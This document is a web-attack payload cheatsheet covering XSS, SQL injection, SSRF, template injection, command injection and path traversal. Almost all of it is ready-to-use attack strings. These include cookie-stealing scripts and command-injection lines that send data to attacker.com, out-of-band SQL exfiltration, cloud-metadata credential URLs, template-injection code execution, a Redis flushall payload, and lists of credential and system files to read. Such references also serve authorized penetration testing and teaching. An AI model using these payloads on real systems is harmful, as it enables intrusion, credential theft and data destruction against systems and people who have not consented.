# Web Payloads Cheatsheet

## Cross-Site Scripting (XSS)

### Basic Payloads
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
<input onfocus=alert(document.domain) autofocus>
<marquee onstart=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<video src=x onerror=alert(document.domain)>
<audio src=x onerror=alert(document.domain)>
```

### Attribute Context Escapes
```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
' onfocus='alert(1)' autofocus='
" onmouseover=alert(1) x="
"><script>alert(1)</script>
'><script>alert(1)</script>
```

### JavaScript Context
```javascript
';alert(1)//
';alert(1);'
\';alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
```

### Filter Bypass
```html
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=\u0061lert(1)>
<a href="javascript:alert(1)">click</a>
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>
<iframe srcdoc="<script>alert(1)</script>">
```

### Cookie Stealing
```html
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>
```

### DOM XSS Sources and Sinks
```
Sources: location.hash, location.search, document.URL, document.referrer, window.name
Sinks: innerHTML, outerHTML, document.write, eval, setTimeout, setInterval, Function()
Test: #<img src=x onerror=alert(1)>
```

---

## SQL Injection

### Detection
```
'
"
`
')
")
`)
'))
' OR 1=1-- -
' OR 'a'='a
" OR "a"="a
' OR 1=1#
1' ORDER BY 1-- -
1' ORDER BY 10-- -
1' UNION SELECT NULL-- -
```

### UNION-Based
```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT username,password,3 FROM users-- -
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

### Error-Based (MySQL)
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)-- -
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

### Blind Boolean
```sql
' AND 1=1-- -    (true - normal response)
' AND 1=2-- -    (false - different response)
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=32-- -
```

### Blind Time-Based
```sql
' AND SLEEP(5)-- -                               (MySQL)
'; WAITFOR DELAY '0:0:5'-- -                     (MSSQL)
' AND pg_sleep(5)-- -                            (PostgreSQL)
' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)-- -
```

### Out-of-Band
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))-- -  (MySQL)
'; EXEC master..xp_dirtree '\\attacker.com\a'-- -                          (MSSQL)
```

### Authentication Bypass
```sql
admin' OR 1=1-- -
admin'-- -
' OR 1=1-- -
' OR ''='
') OR ('1'='1
admin' OR '1'='1'#
```

---

## Server-Side Request Forgery (SSRF)

### Basic Payloads
```
http://127.0.0.1
http://localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8080
http://[::1]
http://0.0.0.0
http://0
```

### Cloud Metadata
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

### Filter Bypass
```
# IP encoding
http://2130706433             (decimal for 127.0.0.1)
http://0x7f000001             (hex for 127.0.0.1)
http://0177.0.0.1             (octal)
http://127.1                  (shorthand)
http://127.0.0.1.nip.io      (DNS rebinding service)
http://spoofed.burpcollaborator.net  (DNS pointing to 127.0.0.1)

# Protocol smuggling
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a   (Redis)
dict://127.0.0.1:6379/INFO                                  (Redis)
file:///etc/passwd

# URL parsing confusion
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1%00@attacker.com
```

---

## Server-Side Template Injection (SSTI)

### Detection
```
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}    (returns 7777777 in Jinja2, 49 in Twig)
```

### Jinja2 (Python/Flask)
```python
{{config}}
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__bases__[0].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Twig (PHP)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

### Freemarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${7*7}
[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}
```

### Pebble (Java)
```
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}
{{ bytes }}
```

### ERB (Ruby)
```
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
```

---

## Command Injection

### Basic Payloads
```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id
\n id
```

### Blind Detection
```bash
; sleep 5
| sleep 5
& sleep 5
`sleep 5`
$(sleep 5)
; curl http://attacker.com/$(whoami)
| nslookup attacker.com
& wget http://attacker.com/?x=$(id|base64)
```

### Filter Bypass
```bash
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'cat\x20/etc/passwd'&&$X
cat<>/etc/passwd

# Keyword bypass
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd

# Slash bypass
cat ${HOME:0:1}etc${HOME:0:1}passwd

# Newline
%0aid
%0a%0did
```

---

## Path Traversal / LFI

### Basic Payloads
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd    (double URL encode)
....\/....\/....\/etc/passwd
/etc/passwd
/etc/passwd%00                          (null byte, old PHP)
```

### PHP Wrappers (LFI to RCE)
```
php://filter/convert.base64-encode/resource=index.php
php://input                             (POST data as code, needs allow_url_include)
php://filter/read=string.rot13/resource=index.php
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
expect://id                             (if expect:// wrapper enabled)
```

### Interesting Linux Files
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/auth.log
/var/log/apache2/access.log
/home/user/.ssh/id_rsa
/home/user/.bash_history
```

### Interesting Windows Files
```
C:\Windows\System32\config\SAM
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Windows\win.ini
C:\boot.ini
C:\Users\<user>\Desktop\flag.txt
```
